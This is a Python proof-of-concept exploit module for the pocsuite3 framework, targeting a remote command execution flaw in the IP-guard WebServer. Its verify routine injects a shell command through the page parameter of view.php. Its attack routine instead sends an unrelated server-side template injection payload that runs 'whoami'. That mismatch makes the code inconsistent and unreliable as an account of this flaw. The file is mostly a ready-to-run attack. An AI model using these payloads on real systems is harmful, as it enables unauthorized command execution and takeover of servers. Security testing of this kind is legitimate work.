# -*- coding: utf-8 -*-
# 2023/11/13 10:35

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OrderedDict, OptString


class IPGaurdRCEPOC(POCBase):
    author = '公众号网络安全透视镜'  # PoC 的作者
    vulDate = '2023-11-10'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2023-11-13'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2023-11-13'  # PoC 更新日期 (%Y-%m-%d)
    name = 'IP-guard webserver 远程命令执行'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'https://www.ip-guard.net/'  # 漏洞厂商主页地址
    appName = 'IP-guard'  # 漏洞应用名称
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = 'IP-guard WebServer 存在远程代码命令执行漏洞，通过此漏洞攻击者可以执行远程命令，操控服务器。'  # 漏洞简要描述


    def _verify(self):
        result = {}
        path = "/ipg/static/appr/lib/flexpaper/php/view.php"  # 参数
        url = self.url + path
        payload = "?doc=1.jpg&format=swf&isSplit=true&page=||echo+123456+%3E111.txt"  # payload
        r = requests.get(url + payload)
        print(r.text)
        # 验证成功输出相关信息
        if r and r.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Name'] = payload

        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "/?name="
        url = self.url + path
        payload = "{{''.__class__.__base__.__subclasses__()[168].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}"
        r = requests.get(url + payload)
        if r and r.status_code == 200 and "www" in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Name'] = payload
            result['VerifyInfo']['Resp'] = r.text

        return self.parse_output(result)

register_poc(IPGaurdRCEPOC)